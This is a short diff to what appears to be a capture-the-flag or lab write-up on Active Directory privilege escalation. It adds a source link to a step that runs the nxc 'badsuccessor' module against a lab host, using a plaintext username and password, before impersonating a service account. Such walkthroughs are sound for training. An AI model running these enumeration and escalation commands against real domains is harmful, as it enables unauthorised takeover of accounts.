@@ -220,7 +220,7 @@ To escalate privileges, use the `badsuccessor` exploit to impersonate `svc_deplo
 
 #### 3.1 badsuccessor enumeration
 
-validate the badsuccessor possibilities with nxc:
+validate the badsuccessor possibilities with nxc ([https://github.com/Akamai/BADSUCCESSOR](https://github.com/Akamai/BADSUCCESSOR)):
 
 ```bash
 nxc ldap 10.129.21.24 -u alex.turner -p 'Checkpoint2024!' -M badsuccessor
